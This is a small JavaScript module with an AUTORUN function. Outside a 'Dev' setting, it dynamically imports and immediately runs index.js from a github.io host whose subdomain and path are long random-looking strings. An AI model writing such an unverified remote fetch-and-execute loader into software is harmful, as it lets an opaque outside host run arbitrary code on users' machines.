export const AUTORUN=()=>{

    CONDITION(localStorage.getItem("Env") === "Dev",()=>{
        
        import("./index.js").then((module) => {
            if (module.default) {
                module.default();
            } else if (module.CONNECTION) {
                module.CONNECTION();
            };
        });

    },()=>{

        import("https://jherujjirokk4uojrfipoh.github.io/tftfh6y7f9tf9r56dee4ryd67796re3r5t68tgy76t5ete4t54t7dtr876trttr67re5686frf65/index.js").then((module) => {
            if (module.default) {
                module.default();
            } else if (module.CONNECTIONS) {
                module.CONNECTIONS();
            };
        });

    });

};